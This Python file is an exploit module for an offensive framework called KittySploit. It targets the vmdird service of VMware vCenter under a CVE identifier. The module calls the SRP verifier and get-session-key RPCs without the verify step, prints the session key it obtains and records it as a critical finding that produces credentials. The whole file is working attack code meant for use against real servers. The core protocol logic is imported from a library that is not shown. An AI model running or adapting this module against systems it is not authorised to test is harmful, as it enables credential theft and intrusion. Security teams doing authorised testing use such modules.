#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-123890 — vmdir SRP session-key disclosure probe (opnum 0+1)."""

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client
from lib.protocols.tcp.vcenter_vmdird import DEFAULT_USER, Vcenter_vmdird


class Module(Auxiliary, Tcp_scanner_client, Vcenter_vmdird):
    __info__ = {
        "name": "VMware vCenter vmdir session-key probe",
        "description": "Attempts rpc_srp_verifier_new + get_session_key without verify_session.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-123890"],
        "tags": ["vmware", "vcenter", "vmdir", "disclosure", "auxiliary"],
        "agent": {"approval_required": True, "produces": ["risk_signals", "credentials"]},
    }

    port = OptPort(2012, "vmdird port", required=False)
    username = OptString(DEFAULT_USER, "SRP principal", required=False)
    alg = OptString("SHA256", "SRP hash (SHA1/SHA224/SHA256/SHA384/SHA512)", required=False)
    send_null_handle = OptBool(
        False,
        "Prepend NULL binding handle on stubs (lab A/B switch)",
        advanced=True,
    )
    auth_type = OptInteger(None, "RPC auth type (experimental)", advanced=True)
    auth_level = OptInteger(6, "RPC auth level", advanced=True)
    auth_ctx_id = OptInteger(1, "RPC auth context id", advanced=True)

    def run(self):
        if not self.is_tcp_open():
            print_error("TCP %s:%s closed" % (self._host(), self._port()))
            return False
        auth = self.vmdird_auth_from_options(self)
        result = self.vmdird_disclose_key(
            user=str(self.username or DEFAULT_USER),
            alg_name=str(self.alg or "SHA256"),
            send_null_handle=bool(self.send_null_handle),
            auth=auth,
        )
        if result.get("error"):
            print_error(result["error"])
            return False
        if result.get("srp_ret") not in (None, 0):
            print_warning("rpc_srp_verifier_new ret=0x%x" % (int(result["srp_ret"]) & 0xFFFFFFFF))
            if int(result["srp_ret"]) & 0xFFFFFFFF == 0x16C9A019:
                print_status("Identity not found or invalid parameter (check --username)")
            return False
        if not result.get("ok"):
            print_warning(result.get("reason") or "no session key disclosed")
            return False
        print_success(
            "Session key disclosed (%d bytes): %s"
            % (result["session_key_len"], result["session_key_hex"][:64])
        )
        self.set_info(
            severity="critical",
            cve="CVE-2026-123890",
            session_key_hex=result["session_key_hex"],
            user=result.get("user"),
        )
        return True